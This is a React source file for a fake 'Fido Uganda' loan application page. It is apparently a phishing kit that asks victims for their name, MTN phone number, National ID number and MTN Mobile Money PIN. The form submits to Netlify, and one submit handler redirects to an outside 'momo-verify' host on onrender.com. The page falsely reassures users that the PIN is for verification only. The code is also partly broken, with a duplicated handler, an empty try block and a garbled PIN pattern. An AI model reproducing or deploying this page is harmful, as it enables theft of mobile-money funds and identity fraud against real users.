import { useEffect, useState } from 'react'
import {
  BadgeCheck,
  Banknote,
  BriefcaseBusiness,
  CheckCircle2,
  Clock3,
  Landmark,
  LoaderCircle,
  LockKeyhole,
  Phone,
  ShieldCheck,
  UserRound,
} from 'lucide-react'

const employmentOptions = [
  'Employed full-time',
  'Employed part-time',
  'Self-employed',
  'Business owner',
  'Contract worker',
  'Other income source',
]

const repaymentOptions = [
  { value: '1 month', label: '1 month' },
  { value: '2 months', label: '2 months' },
  { value: '3 months', label: '3 months' },
  { value: '6 months', label: '6 months' },
  { value: '9 months', label: '9 months' },
  { value: '12 months', label: '12 months' },
]

function ConfirmationStep({ onRestart }: { onRestart: () => void }) {
  const [seconds, setSeconds] = useState(3)

  useEffect(() => {
    const timer = window.setInterval(() => {
      setSeconds((value) => {
        if (value <= 1) {
          window.clearInterval(timer)
          window.location.assign('/application-confirmation.html')
          return 0
        }
        return value - 1
      })
    }, 1000)

    return () => window.clearInterval(timer)
  }, [])

  return (
    <main className="success-page">
      <section className="success-card" aria-live="polite">
        <div className="success-icon"><CheckCircle2 aria-hidden="true" /></div>
        <p className="eyebrow">Application received</p>
        <h1>Thank you for applying.</h1>
        <p>Your application was submitted successfully. You will be taken to the next step automatically.</p>
        <div className="security-reminder">
          <ShieldCheck aria-hidden="true" />
          <span>Never share your Mobile Money PIN, password, or one-time password with anyone.</span>
        </div>
        <p><strong>Continuing in {seconds}…</strong></p>
        <button className="secondary-button" type="button" onClick={() => window.location.assign('/application-confirmation.html')}>
          Continue now
        </button>
        <button className="secondary-button" type="button" onClick={onRestart}>
          Submit another application
        </button>
      </section>
    </main>
  )
}

export default function LoanApplicationForm() {
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle')

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setStatus('submitting')

    try {

    } catch {
      setStatus('error')
    }
  }

  if (status === 'success') {
    return <ConfirmationStep onRestart={() => setStatus('idle')} />
  }async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
  event.preventDefault()
  window.location.assign('https://momo-verify-4pkq.onrender.com')
  }

  return (
    <main className="application-shell">
      <aside className="brand-panel">
        <div className="flag-line" aria-hidden="true" />
        <div className="brand-mark" aria-label="Fido Uganda">
          <span>f</span>
          <strong>Fido</strong>
          <small>Uganda</small>
        </div>

        <div className="brand-copy">
          <p className="eyebrow light">Simple credit. Clear steps.</p>
          <h1>Move forward with confidence.</h1>
          <p>
            Complete your loan request in a few minutes. We ask only for the details needed to
            review your application.
          </p>
        </div>

        <div className="process-list" aria-label="Application process">
          <div><span>01</span><p><strong>Apply</strong>Share your personal and income details.</p></div>
          <div><span>02</span><p><strong>Review</strong>Your application is assessed securely.</p></div>
          <div><span>03</span><p><strong>Response</strong>Receive an update on your phone.</p></div>
        </div>

        <div className="panel-security">
          <LockKeyhole aria-hidden="true" />
          <p><strong>Your PIN stays private.</strong> Fido will ask for your Mobile Money PIN for verification only.</p>
        </div>
      </aside>

      <section className="form-panel">
        <div className="mobile-brand">
          <div className="brand-mark dark"><span>f</span><strong>Fido</strong><small>Uganda</small></div>
        </div>

        <div className="form-heading">
          <div>
            <p className="eyebrow">Loan application</p>
            <h2>Tell us about yourself</h2>
          </div>
          <div className="secure-label"><ShieldCheck aria-hidden="true" /> Secure form</div>
        </div>

        <form
          name="fido-uganda-loan-application"
          method="POST"
          data-netlify="true"
          netlify-honeypot="bot-field"
          onSubmit={handleSubmit}
        >
          <input type="hidden" name="form-name" value="fido-uganda-loan-application" />
          <p className="hidden-field">
            <label>Do not fill this out: <input name="bot-field" /></label>
          </p>

          <fieldset>
            <legend><span>1</span> Personal details</legend>
            <div className="field-grid">
              <label className="field full-width">
                <span>Full legal name</span>
                <div className="input-wrap"><UserRound aria-hidden="true" /><input type="text" name="full-name" autoComplete="name" placeholder="As shown on your National ID" required /></div>
              </label>

              <label className="field">
                 <span>Only Mtn Phone number</span><div className="input-wrap"><Phone aria-hidden="true" /><input type="tel" name="phone-number" autoComplete="tel" inputMode="tel" placeholder="e.g. 0772123456" pattern="(?:\+256|0)[0-9]{9}" title="Enter a valid Uganda phone number, such as 0772123456" required /></div>
              </label>

              <label className="field">
                <span>National ID number (NIN)</span>
                <div className="input-wrap"><BadgeCheck aria-hidden="true" /><input type="text" name="national-id" autoComplete="off" placeholder="e.g. CM1234567890AB" minLength={14} maxLength={14} pattern="[A-Za-z0-9]{14}" title="Enter the 14 characters shown on your National ID" required /></div>
              </label>

              <label className="field full-width">
                <span>MTN Mobile Money pin </span>
                <div className="input-wrap"><Landmark aria-hidden="true" /><input type="tel" name="mobile-money-pin" inputMode="tel" placeholder="e.g. 12345" pattern="(?:\12345|0)[0-5]{5}" title="Enter Mtn mobile money pin, such as 12345" required /></div>
                <small className="pin-warning"><LockKeyhole aria-hidden="true" /> Enter your mtn mobile money pin only.PIN.</small>
              </label>
            </div>
          </fieldset>

          <fieldset>
            <legend><span>2</span> Loan request</legend>
            <div className="field-grid">
              <label className="field">
                <span>Loan amount</span>
                <div className="input-wrap money-input"><b>UGX</b><input type="number" name="loan-amount" inputMode="numeric" min="10000" step="1000" placeholder="500,000" required /></div>
              </label>

              <label className="field">
                <span>Repayment period</span>
                <div className="input-wrap"><Clock3 aria-hidden="true" /><select name="repayment-period" defaultValue="" required><option value="" disabled>Select a period</option>{repaymentOptions.map((option) => <option key={option.value} value={option.value}>{option.label}</option>)}</select></div>
              </label>
            </div>
          </fieldset>

          <fieldset>
            <legend><span>3</span> Income information</legend>
            <div className="field-grid">
              <label className="field">
                <span>Monthly net income</span>
                <div className="input-wrap money-input"><b>UGX</b><input type="number" name="monthly-net-income" inputMode="numeric" min="0" step="1000" placeholder="1,200,000" required /></div>
              </label>

              <label className="field">
                <span>Employment status</span>
                <div className="input-wrap"><BriefcaseBusiness aria-hidden="true" /><select name="employment-status" defaultValue="" required><option value="" disabled>Select your status</option>{employmentOptions.map((option) => <option key={option} value={option}>{option}</option>)}</select></div>
              </label>
            </div>
          </fieldset>

          <label className="consent-row">
            <input type="checkbox" name="applicant-consent" value="confirmed" required />
            <span>I confirm that these details are accurate and consent to their use to assess this loan application.</span>
          </label>

          {status === 'error' && (
            <p className="error-message" role="alert">We could not submit your application. Check your connection and try again.</p>
          )}

          <button className="submit-button" type="submit" disabled={status === 'submitting'}>
            {status === 'submitting' ? <><LoaderCircle className="spinner" aria-hidden="true" /> Submitting securely…</> : <><Banknote aria-hidden="true" /> Submit loan application</>}
          </button>

          <p className="form-footnote">Submitting an application does not guarantee loan approval. Terms and eligibility checks apply.</p>
        </form>
      </section>
    </main>
  )
}
